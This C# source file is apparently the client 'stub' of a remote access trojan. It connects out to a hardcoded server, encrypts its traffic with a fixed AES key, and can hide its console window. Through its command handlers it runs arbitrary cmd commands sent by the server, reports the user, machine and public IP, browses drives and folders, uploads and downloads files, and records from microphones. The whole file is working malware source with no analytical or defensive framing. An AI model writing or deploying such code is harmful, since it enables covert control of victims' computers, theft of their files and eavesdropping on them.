using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Globalization;
using System.Net.Http;
using System.Runtime.InteropServices;
using NAudio.Wave;
using NAudio.CoreAudioApi;
using NAudio.Lame;



namespace Stub
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private const int _PORT = 5656;
        private static string fup_location = "";
        private static int fup_size = 0;
        private static String fdl_location = "";
        private static bool isFileDownload = false;
        private static int writesize = 0;
        private static byte[] recvFile = new byte[1];
        private static string sysip = "";
        private static string currentUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        private static bool isDisconnect = false;


        static int no_of_devices = 0;
        static MemoryStream[] m_stream;
        static WaveFileWriter[] waveFile;
        static int current_mic = -1;

        static void Main(string[] args)
        {
           // hideConsole();
            GetLocalIPAddress();
            ConnectToServer();
            RequestLoop();
        }

        public static void hideConsole()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        public static void ConnectToServer()
        {
            int attempts = 0;

            while (!_clientSocket.Connected)
            {
                try
                {
                    attempts++;
                    Console.WriteLine("Connection attempt " + attempts);

                    _clientSocket.Connect(IPAddress.Parse("192.168.0.105"), _PORT);
                }
                catch (SocketException)
                {
                    Console.Clear();
                }
            }
            Console.Clear();
            Console.WriteLine("Connected");

        }

        private static void RequestLoop()
        {
            while (true)
            {
                if (isDisconnect) break;

                ReceiveResponse();
            }

            Console.WriteLine("Connection Ended");
            _clientSocket.Shutdown(SocketShutdown.Both);
            _clientSocket.Close();
            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ConnectToServer();
            isDisconnect = false;

            RequestLoop();
        }

        public static void activateMic(int mic_seleceted)
        {
            DateTime time1 = DateTime.Now;
            string formattedTime = time1.ToString("hh_mm_ss_dd_MM_yyyy");


            WaveInEvent[] waveSourceArr = new WaveInEvent[no_of_devices];

            Console.WriteLine("Now recording...");
            if (mic_seleceted != -1)
            {
                //string filename = "mic" + (mic_seleceted + 1) + "_" + formattedTime + ".wav";
                current_mic = 0;
                waveSourceArr[0] = new WaveInEvent();
                waveSourceArr[0].DeviceNumber = mic_seleceted;
                waveSourceArr[0].WaveFormat = new WaveFormat(44100, 1);
                waveSourceArr[0].DataAvailable += new EventHandler<WaveInEventArgs>(WaveSource_DataAvailable);

                //waveFile[0] = new WaveFileWriter(@"C:\Temp\" + filename, waveSourceArr[0].WaveFormat);
                m_stream[0] = new MemoryStream(4500000);
                waveFile[0] = new WaveFileWriter(m_stream[0], waveSourceArr[0].WaveFormat);
                waveSourceArr[0].StartRecording();

                while (true)
                {
                    if (m_stream[0].Length > 1048576) //4194304
                        break;
                }

                waveSourceArr[0].StopRecording();
                waveFile[0].Dispose();
                byte[] wav_arr = m_stream[0].ToArray();
                byte[] mp3_arr = ConvertWavToMp3(wav_arr);


                Console.WriteLine("Press enter to stop");
                Console.ReadLine();

                System.IO.File.WriteAllBytes(@"C:\temp\mic" + (mic_seleceted + 1) + "_" + formattedTime + ".mp3", mp3_arr);
                System.IO.File.WriteAllBytes(@"C:\temp\mic" + (mic_seleceted + 1) + "_" + formattedTime + ".wav", wav_arr);


            }
            else
            {
                //mic_selected is -1 right now
                for (int i = 0; i < no_of_devices; ++i)
                {
                    mic_seleceted = i;
                    current_mic = i;
                    //string filename = "mic" + (mic_seleceted + 1) + "_" + formattedTime + ".wav";
                    waveSourceArr[i] = new WaveInEvent();
                    waveSourceArr[i].DeviceNumber = mic_seleceted;
                    waveSourceArr[i].WaveFormat = new WaveFormat(44100, 1);
                    waveSourceArr[i].DataAvailable += new EventHandler<WaveInEventArgs>(WaveSource_DataAvailable);

                    //waveFile[i] = new WaveFileWriter(@"C:\Temp\" + filename, waveSourceArr[0].WaveFormat);
                    m_stream[i] = new MemoryStream(4500000);
                    waveFile[i] = new WaveFileWriter(m_stream[i], waveSourceArr[i].WaveFormat);

                    waveSourceArr[i].StartRecording();

                }

                while (true)
                {
                    if (m_stream[1].Length > 1048576) //4194304
                        break;
                }

                Console.WriteLine("Press enter to stop");
                Console.ReadLine();
                for (int j = 0; j < no_of_devices; ++j)
                {
                    waveSourceArr[j].StopRecording();
                    waveFile[j].Dispose();
                }
                byte[] wav_arr = m_stream[0].ToArray();
                byte[] wav_arr2 = m_stream[1].ToArray();

            }
        }

        public static byte[] ConvertWavToMp3(byte[] wavFile)
        {

            using (var retMs = new MemoryStream())
            using (var ms = new MemoryStream(wavFile))
            using (var rdr = new WaveFileReader(ms))
            using (var wtr = new LameMP3FileWriter(retMs, rdr.WaveFormat, 64 /*Maybe 128*/))
            {
                rdr.CopyTo(wtr);
                return retMs.ToArray();
            }


        }

        public static Dictionary<string, MMDevice> GetInputAudioDevices()
        {
            int count = 0;
            Dictionary<string, MMDevice> retVal = new Dictionary<string, MMDevice>();
            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
            int waveInDevices = WaveIn.DeviceCount;
            for (int waveInDevice = 0; waveInDevice < waveInDevices; waveInDevice++)
            {
                WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(waveInDevice);
                foreach (MMDevice device in enumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.All))
                {
                    if (device.FriendlyName.StartsWith(deviceInfo.ProductName))
                    {
                        try
                        {
                            retVal.Add(device.FriendlyName, device);
                        }
                        catch
                        {
                            ++count;
                            retVal.Add(device.FriendlyName + " " + count, device);
                        }
                        break;
                    }
                }
            }

            return retVal;
        }

        public static void startRecording()
        {
            no_of_devices = WaveIn.DeviceCount;

            waveFile = new WaveFileWriter[no_of_devices];
            m_stream = new MemoryStream[no_of_devices];

            Console.WriteLine("There are " + no_of_devices + " microphones connected..");
            int count = 1;
            foreach (KeyValuePair<string, MMDevice> device in GetInputAudioDevices())
            {
                Console.WriteLine("{0}. Name: {1}, State: {2}", count, device.Key, device.Value.State);
                ++count;
            }
            Console.WriteLine("Enter mic # to use or enter 0 to record from all mics: ");
            String str = Console.ReadLine();
            int mic_selected = Convert.ToInt32(str) - 1;
            activateMic(mic_selected);
        }

        static void WaveSource_DataAvailable(object sender, WaveInEventArgs e)
        {

            waveFile[current_mic].Write(e.Buffer, 0, e.BytesRecorded);

        }

        public static bool checkConnection(Socket s)
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);
            bool part2 = (s.Available == 0);
            if (part1 && part2)
                return true;//makes isDisconneted true
            else
                return false;//makes isDisconneted false
        }

        public static void ReceiveResponse()
        {
            try
            {
                var buffer = new byte[2048];
                int received = _clientSocket.Receive(buffer, SocketFlags.None);
                if (received == 0) return;
                var data = new byte[received];
                Array.Copy(buffer, data, received);

                if (isFileDownload)
                {
                    Buffer.BlockCopy(data, 0, recvFile, writesize, data.Length);

                    writesize += data.Length;

                    if (writesize == fup_size)
                    {
                        Console.WriteLine("Create File " + recvFile.Length);

                        using (FileStream fs = File.Create(fup_location))
                        {
                            Byte[] info = recvFile;
                            // Add some information to the file.
                            fs.Write(info, 0, info.Length);
                        }

                        Array.Clear(recvFile, 0, recvFile.Length);
                        sendCommand("received");
                        writesize = 0;
                        isFileDownload = false;
                        return;

                    }
                }

                if (!isFileDownload)
                {
                    string text = Encoding.Unicode.GetString(data);
                    text = Decrypt(text);
                    Console.WriteLine(text);

                    if (text.StartsWith("getinfo->"))
                    {
                        string culture = CultureInfo.CurrentCulture.EnglishName;
                        int id = int.Parse(text.Split('>')[1]);
                        while (sysip == "") ;
                        string info = currentUser + "|" + sysip + "|" + Environment.MachineName + "|" + culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);
                        string inf = "inf->" + id.ToString() + "♫" + info;
                        sendCommand(inf);

                    }
                    if (text.StartsWith("exec->"))
                    {
                        string cmd = text.Split('>')[1];
                        execComm(cmd);

                    }
                    if (text == "ldrives")
                    {
                        DriveInfo[] drives = DriveInfo.GetDrives();

                        String info = "";

                        foreach (DriveInfo d in drives)
                        {
                            if (d.IsReady)
                            {
                                info += d.Name + "|" + d.TotalSize / 1024 / 1024 / 1024 + "GB|" + d.DriveType + "\n";
                            }
                            else
                            {
                                info += d.Name + "\n";
                            }
                        }

                        String resp = "ldrives->" + info;
                        sendCommand(resp);
                    }
                    if (text.StartsWith("fdir->"))
                    {
                        String path = text.Split('>')[1];
                        Console.WriteLine(path);
                        bool passed = false;
                        if (path.Length == 3 && path.Contains(":\\"))
                        {
                            passed = true;
                        }
                        if (!passed && Directory.Exists(path))
                        {
                            passed = true;
                        }
                        if (!passed)
                        {
                            return;
                        }
                        Console.WriteLine("Valid = true");
                        String[] directories = Directory.GetDirectories(path);
                        String[] files = Directory.GetFiles(path);
                        List<String> dir = new List<String>();
                        List<String> file = new List<String>();
                        String fi = "";
                        String di = "";

                        foreach (String d in directories)
                        {
                            String size = "N/A";
                            String name = d.Replace(path, "");
                            String crtime = Directory.GetCreationTime(d).ToString();
                            String pth = d;
                            String cont = name + "|" + size + "|" + crtime + "|" + pth;
                            dir.Add(cont);
                        }

                        foreach (String f in files)
                        {
                            String size = new FileInfo(f).Length.ToString();
                            String name = Path.GetFileName(f);
                            String crtime = File.GetCreationTime(f).ToString();
                            String pth = f;
                            String cont = name + "|" + size + "|" + crtime + "|" + pth;
                            file.Add(cont);
                        }

                        foreach (String c in dir)
                        {
                            di += c + "\n";
                        }

                        foreach (String f in file)
                        {
                            fi += f + "\n";
                        }

                        String final = di + fi;
                        sendCommand("fdir->" + final);
                    }
                    if (text.StartsWith("fup->"))
                    {
                        string location = text.Split('>')[1];
                        int size = int.Parse(text.Split('>')[2]);
                        fup_location = location;
                        fup_size = size;
                        isFileDownload = true;
                        recvFile = new byte[fup_size];
                        sendCommand("fconfirm");
                    }
                    if (text.StartsWith("fdl->"))
                    {
                        String file = text.Split('>')[1];
                        if (!File.Exists(file))
                        {
                            return;
                        }
                        String size = new FileInfo(file).Length.ToString();
                        fdl_location = file;
                        sendCommand("finfo->" + size);
                    }
                    if (text == "fconfirm")
                    {
                        Byte[] sendFile = File.ReadAllBytes(fdl_location);
                        sendByte(sendFile);
                    }
                }
                

            }
            catch (Exception)
            {
                isDisconnect = checkConnection(_clientSocket);
            }
        }
        

        public static void execComm(string command)
        {
            System.Diagnostics.ProcessStartInfo procstartinf = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
            procstartinf.RedirectStandardOutput = true;
            procstartinf.RedirectStandardError = true;
            procstartinf.UseShellExecute = false;
            procstartinf.CreateNoWindow = true;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procstartinf;
            proc.Start();
            string resl = null, err = null;
            resl = proc.StandardOutput.ReadToEnd();
            err = proc.StandardError.ReadToEnd();
            sendCommand(resl);
            sendCommand(err);

        }

        async public static void GetLocalIPAddress()
        {
            using (HttpClient client = new HttpClient())
            {
                using (HttpResponseMessage response = await client.GetAsync("http://ipinfo.io/ip"))
                {
                    using (HttpContent content = response.Content)
                    {
                        sysip =await content.ReadAsStringAsync();
                        Console.WriteLine(sysip);
                    }
                }
            }
        }

        public static string Encrypt(string clearText)
        {
            string EncryptionKey = "MAKV2SPBNI99212";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;

        }

        public static string Decrypt(string cipherText)
        {
            string EncryptionKey = "MAKV2SPBNI99212";
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = Encoding.Unicode.GetString(ms.ToArray());
                }
            }
            return cipherText;
        }

        private static void sendCommand(String response)
        {
            String k = response;

            String crypted = Encrypt(k);
            byte[] data = Encoding.Unicode.GetBytes(crypted);
            try
            {
                _clientSocket.Send(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private static void sendByte(byte[] data)
        {
            if (!_clientSocket.Connected)
            {
                Console.WriteLine("Socket is not connected!");
                return;
            }
            // _clientSocket.Send(data);
            try
            {
                _clientSocket.Send(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Send Byte Failure " + ex.Message);
                return;
            }

        }
    }
}
